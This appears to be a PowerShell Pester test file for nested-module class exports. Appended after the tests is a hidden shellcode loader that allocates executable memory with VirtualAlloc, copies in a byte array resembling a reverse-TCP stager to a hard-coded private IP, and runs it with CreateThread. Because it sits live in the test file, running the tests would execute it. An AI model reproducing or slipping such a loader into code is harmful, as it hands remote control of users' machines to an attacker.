

Describe 'NestedModules' -Tags "CI" {

    function New-TestModule {
        param(
            [string]$Name,
            [string]$Content,
            [string[]]$NestedContents
        )

        new-item -type directory -Force "TestDrive:\$Name" > $null
        $manifestParams = @{
            Path = "TestDrive:\$Name\$Name.psd1"
        }

        if ($Content) {
            Set-Content -Path "${TestDrive}\$Name\$Name.psm1" -Value $Content
            $manifestParams['RootModule'] = "$Name.psm1"
        }

        if ($NestedContents) {
            $manifestParams['NestedModules'] = 1..$NestedContents.Count | ForEach-Object {
                $null = new-item -type directory TestDrive:\$Name\Nested$_
                $null = Set-Content -Path "${TestDrive}\$Name\Nested$_\Nested$_.psm1" -Value $NestedContents[$_ - 1]
                "Nested$_"
            }
        }

        New-ModuleManifest @manifestParams

        $resolvedTestDrivePath = Split-Path ((get-childitem TestDrive:\)[0].FullName)
        if (-not ($env:PSModulePath -like "*$resolvedTestDrivePath*")) {
            $env:PSModulePath += "$([System.IO.Path]::PathSeparator)$resolvedTestDrivePath"
        }
    }

    $originalPSModulePath = $env:PSModulePath

    try {

        
        New-TestModule -Name NoRoot -NestedContents @(
            'class A { [string] foo() { return "A1"} }',
            'class A { [string] foo() { return "A2"} }'
        )

        New-TestModule -Name WithRoot -NestedContents @(
            'class A { [string] foo() { return "A1"} }',
            'class A { [string] foo() { return "A2"} }'
        ) -Content 'class A { [string] foo() { return "A0"} }'

        New-TestModule -Name ABC -NestedContents @(
            'class A { [string] foo() { return "A"} }',
            'class B { [string] foo() { return "B"} }'
        ) -Content 'class C { [string] foo() { return "C"} }'

        It 'Get-Module is able to find types' {
            $module = Get-Module NoRoot -ListAvailable
            $module.GetExportedTypeDefinitions().Count | Should -Be 1

            $module = Get-Module WithRoot -ListAvailable
            $module.GetExportedTypeDefinitions().Count | Should -Be 1

            $module = Get-Module ABC -ListAvailable
            $module.GetExportedTypeDefinitions().Count | Should -Be 3
        }

        It 'Import-Module pick the right type' {
            $module = Import-Module ABC -PassThru
            $module.GetExportedTypeDefinitions().Count | Should -Be 3
            $module = Import-Module ABC -PassThru -Force
            $module.GetExportedTypeDefinitions().Count | Should -Be 3

            $module = Import-Module NoRoot -PassThru
            $module.GetExportedTypeDefinitions().Count | Should -Be 1
            $module = Import-Module NoRoot -PassThru -Force
            $module.GetExportedTypeDefinitions().Count | Should -Be 1
            [scriptblock]::Create(@'
using module NoRoot
[A]::new().foo()
'@
).Invoke() | Should -Be A2

            $module = Import-Module WithRoot -PassThru
            $module.GetExportedTypeDefinitions().Count | Should -Be 1
            $module = Import-Module WithRoot -PassThru -Force
            $module.GetExportedTypeDefinitions().Count | Should -Be 1
            [scriptblock]::Create(@'
using module WithRoot
[A]::new().foo()
'@
).Invoke() | Should -Be A0
        }

        Context 'execute type creation in the module context' {

            
            class A { [string] foo() { return "local"} }
            class B { [string] foo() { return "local"} }
            class C { [string] foo() { return "local"} }

            
            
            
            It 'Can execute type creation in the module context with new()' -pending {
                & (Get-Module ABC) { [C]::new().foo() } | Should -Be C
                & (Get-Module NoRoot) { [A]::new().foo() } | Should -Be A2
                & (Get-Module WithRoot) { [A]::new().foo() } | Should -Be A0
                & (Get-Module ABC) { [A]::new().foo() } | Should -Be A
            }

            It 'Can execute type creation in the module context with New-Object' {
                & (Get-Module ABC) { (New-Object C).foo() } | Should -Be C
                & (Get-Module NoRoot) { (New-Object A).foo() } | Should -Be A2
                & (Get-Module WithRoot) { (New-Object A).foo() } | Should -Be A0
                & (Get-Module ABC) { (New-Object A).foo() } | Should -Be A
            }
        }

    } finally {
        $env:PSModulePath = $originalPSModulePath
        Get-Module @('ABC', 'NoRoot', 'WithRoot') | Remove-Module
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x82,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

